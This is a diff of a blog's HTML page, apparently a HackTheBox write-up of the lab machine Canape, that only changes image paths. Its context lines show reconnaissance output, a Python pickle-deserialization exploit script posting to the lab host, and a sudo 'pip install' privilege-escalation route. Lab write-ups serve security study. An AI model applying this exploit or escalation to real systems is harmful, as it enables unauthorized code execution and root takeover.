@@ -44,7 +44,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 12.98 seconds
-</code></pre><ul><li>Web server</li></ul><p><img src=./images/1.png></p><ul><li><code>.git</code></li></ul><p><img src=./images/2.png></p><p><img src=./images/3.png></p><pre tabindex=0><code>└─$ git clone http://git.canape.htb/simpsons.git                                                                                                               
+</code></pre><ul><li>Web server</li></ul><p><img src=/posts/cybersecurity/hackthebox/machines/linux/canape/images/1.png></p><ul><li><code>.git</code></li></ul><p><img src=/posts/cybersecurity/hackthebox/machines/linux/canape/images/2.png></p><p><img src=/posts/cybersecurity/hackthebox/machines/linux/canape/images/3.png></p><pre tabindex=0><code>└─$ git clone http://git.canape.htb/simpsons.git                                                                                                               
 Cloning into &#39;simpsons&#39;...
 remote: Counting objects: 49, done.
 remote: Compressing objects: 100% (47/47), done.
@@ -63,7 +63,7 @@ a389475 trollface
 f9be9a9 add note
 c8a74a0 temporarily hide check due to vulerability
 e7bfbcf initial
-</code></pre><ul><li>If we checkout to <code>c8a74a0</code>, the vulnerability could be related to <code>cPickle.loads</code>, which deserializes data</li></ul><p><img src=./images/4.png></p><ul><li>The current commit still uses <code>cPickle.loads</code>, which we can try to exploit<ul><li>Send <code>char</code> and <code>quote</code> which will contain <code>p1</code> and <code>payload</code> to exploit the library</li><li>I also have to have <code>char</code> to be one of the whitelisted characters from the source code</li></ul></li></ul><p><img src=./images/5.png></p><ul><li>Let&rsquo;s generate a payload<ul><li><a href=https://exploit-notes.hdks.org/exploit/web/framework/python/python-pickle-rce/ target=_blank rel=noopener>https://exploit-notes.hdks.org/exploit/web/framework/python/python-pickle-rce/</a></li><li>Script used to exploit</li></ul></li></ul><pre tabindex=0><code>import cPickle
+</code></pre><ul><li>If we checkout to <code>c8a74a0</code>, the vulnerability could be related to <code>cPickle.loads</code>, which deserializes data</li></ul><p><img src=/posts/cybersecurity/hackthebox/machines/linux/canape/images/4.png></p><ul><li>The current commit still uses <code>cPickle.loads</code>, which we can try to exploit<ul><li>Send <code>char</code> and <code>quote</code> which will contain <code>p1</code> and <code>payload</code> to exploit the library</li><li>I also have to have <code>char</code> to be one of the whitelisted characters from the source code</li></ul></li></ul><p><img src=/posts/cybersecurity/hackthebox/machines/linux/canape/images/5.png></p><ul><li>Let&rsquo;s generate a payload<ul><li><a href=https://exploit-notes.hdks.org/exploit/web/framework/python/python-pickle-rce/ target=_blank rel=noopener>https://exploit-notes.hdks.org/exploit/web/framework/python/python-pickle-rce/</a></li><li>Script used to exploit</li></ul></li></ul><pre tabindex=0><code>import cPickle
 import os
 import sys
 import requests
@@ -98,7 +98,7 @@ if __name__ == &#34;__main__&#34;:
 	data = { &#39;id&#39; : _id }
 	r = requests.post(&#39;http://10.10.10.70/check&#39;, data = data, timeout=1)
 	print(r.content)
-</code></pre><ul><li>Execute the script</li></ul><p><img src=./images/6.png></p><h2 id=user>User</h2><ul><li>We saw from source that application uses <a href=https://couchdb.apache.org/ target=_blank rel=noopener>couchdb</a></li></ul><pre tabindex=0><code>www-data@canape:/$ netstat -tulpn | grep LISTEN
+</code></pre><ul><li>Execute the script</li></ul><p><img src=/posts/cybersecurity/hackthebox/machines/linux/canape/images/6.png></p><h2 id=user>User</h2><ul><li>We saw from source that application uses <a href=https://couchdb.apache.org/ target=_blank rel=noopener>couchdb</a></li></ul><pre tabindex=0><code>www-data@canape:/$ netstat -tulpn | grep LISTEN
 (Not all processes could be identified, non-owned process info
  will not be shown, you would have to be root to see it all.)
 tcp        0      0 0.0.0.0:65535           0.0.0.0:*               LISTEN      -               
@@ -156,7 +156,7 @@ Matching Defaults entries for homer on canape:
 
 User homer may run the following commands on canape:
     (root) /usr/bin/pip install *
-</code></pre><ul><li>Check <a href=https://gtfobins.github.io/gtfobins/pip/#sudosu target=_blank rel=noopener>GTFOBins</a></li></ul><p><img src=./images/7.png></p></div><div class="row pl-3 pr-3"><div class="col-md-6 share-buttons"><strong>Share on:</strong>
+</code></pre><ul><li>Check <a href=https://gtfobins.github.io/gtfobins/pip/#sudosu target=_blank rel=noopener>GTFOBins</a></li></ul><p><img src=/posts/cybersecurity/hackthebox/machines/linux/canape/images/7.png></p></div><div class="row pl-3 pr-3"><div class="col-md-6 share-buttons"><strong>Share on:</strong>
 <a class="btn btn-sm twitter-btn" href="https://twitter.com/share?url=https%3a%2f%2fumarbaevb.github.io%2fposts%2fcybersecurity%2fhackthebox%2fmachines%2flinux%2fcanape%2f&text=%5bHTB%5d%20Machine%3a%20Canape&via=Personal%20Blog" target=_blank><i class="fab fa-twitter"></i>
 </a><a class="btn btn-sm reddit-btn" href="https://reddit.com/submit?url=https%3a%2f%2fumarbaevb.github.io%2fposts%2fcybersecurity%2fhackthebox%2fmachines%2flinux%2fcanape%2f&title=%5bHTB%5d%20Machine%3a%20Canape" target=_blank><i class="fab fa-reddit"></i>
 </a><a class="btn btn-sm linkedin-btn" href="https://www.linkedin.com/shareArticle?url=https%3a%2f%2fumarbaevb.github.io%2fposts%2fcybersecurity%2fhackthebox%2fmachines%2flinux%2fcanape%2f&title=%5bHTB%5d%20Machine%3a%20Canape" target=_blank><i class="fab fa-linkedin"></i>
